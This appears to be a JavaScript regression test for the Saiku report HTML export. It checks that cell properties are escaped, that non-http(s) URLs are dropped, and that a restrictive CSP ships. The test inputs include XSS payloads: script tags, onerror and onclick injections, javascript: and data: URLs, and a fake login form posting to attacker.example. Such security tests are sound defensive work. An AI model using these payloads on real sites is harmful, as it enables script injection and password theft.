import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import vm from 'node:vm';

const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const resources = join(root, 'saiku-core/saiku-web/src/main/resources/org/saiku/web/export');
const context = vm.createContext({});
for (const name of ['underscore.js', 'SaikuRenderer.js', 'SaikuTableRenderer.js']) {
  vm.runInContext(readFileSync(join(resources, name), 'utf8'), context, { filename: name });
}

// One DATA_CELL whose properties carry the payloads from the issue
// (FORMAT_STRING cell properties are attacker-choosable by a query author).
const render = (properties, wrapContent) => vm.runInContext(
  `new SaikuTableRenderer().render({
    cellset: [[
      { type: 'COLUMN_HEADER', value: 'Sales', properties: {} },
      { type: 'DATA_CELL', value: '266773', properties: ${JSON.stringify(properties)} },
    ]],
    topOffset: 1, leftOffset: 1,
    rowTotalsLists: null, colTotalsLists: null,
  }, { wrapContent: ${wrapContent} })`,
  context
);

// C1 — property payloads cannot introduce elements or attributes.
const injection = "x'><h1>injected</h1><form/action='http://attacker.example/p'><input/name='username'><input/type='password'name='password'><button>Sign in</button></form><img/src='y";
const html = render(
  {
    image: "http://attacker.example/collect?v='onerror='alert(1)",
    image_height: "10' onerror='alert(2)",
    image_width: "10' src='http://attacker.example/w",
    style: "red'><script>alert(3)</script>",
    link: "http://attacker.example/l'onclick='alert(4)",
    arrow: "up'><img src=x onerror=alert(5)",
    raw: "r'><script>alert(6)</script>",
    position: "0:1'><script>alert(7)</script>",
  },
  true
);
assert.doesNotMatch(html, /\son(?:error|click|load)\s*=\s*["']/i, 'a property payload added an event-handler attribute');
assert.doesNotMatch(html, /href='http:\/\/attacker\.example\/l'/, 'the link property escaped its payload into the href');
assert.match(html, /&lt;script&gt;/, 'the style payload is rendered as escaped text');
assert.match(html, /src='http:\/\/attacker\.example\/collect/, 'an http(s) image property still renders');

// C2 — non-http(s) link and image properties are dropped, not rendered.
const js = render({ image: 'javascript:alert(1)', link: 'javascript:alert(2)' }, false);
assert.doesNotMatch(js, /javascript:/i, 'a javascript: URL reached the export HTML');
assert.doesNotMatch(js, /<a\b/i, 'a dropped link property must not render an anchor');
assert.match(js, /266773/, 'with the image property dropped the escaped cell value stays');
const rel = render({ image: 'images/pic.gif', link: '/homes/x' }, false);
assert.doesNotMatch(rel, /<img\b|<a\b/i, 'a relative URL is not a link/image property');
const data = render({ image: 'data:text/html,<script>alert(1)</script>', link: 'data:text/html,x' }, false);
assert.doesNotMatch(data, /data:/i, 'a data: URL reached the export HTML');

// C3 — the non-SPA CSP carries form-action and a restrictive img-src.
const filter = readFileSync(
  join(root, 'saiku-core/saiku-web/src/main/java/org/saiku/web/servlet/SecurityHeadersFilter.java'),
  'utf8'
);
const start = filter.indexOf('NON_SPA_CSP =');
assert.notEqual(start, -1, 'SecurityHeadersFilter must ship a default non-SPA CSP (NON_SPA_CSP)');
const end = filter.indexOf('";', start);
const csp = filter
  .slice(start, end + 1)
  .replace(/NON_SPA_CSP\s*=\s*|"[^"]*"/g, (m) => (m.startsWith('NON_SPA') ? '' : m.slice(1, -1)))
  .replace(/["+\s]+/g, ' ')
  .trim();
assert.match(csp, /form-action 'self'/, "the non-SPA CSP must carry form-action 'self'");
const img = csp.match(/img-src\s+([^;]+);/)?.[1] ?? '';
assert.match(img, /'self'/, "the non-SPA CSP must carry an img-src limited to 'self'");
assert.doesNotMatch(img, /\*|\bhttps?:/, 'the non-SPA img-src must not allow arbitrary hosts');

process.stdout.write('HTML export escapes cell properties, drops non-http(s) URLs, and the non-SPA CSP carries form-action and a self-limited img-src\n');
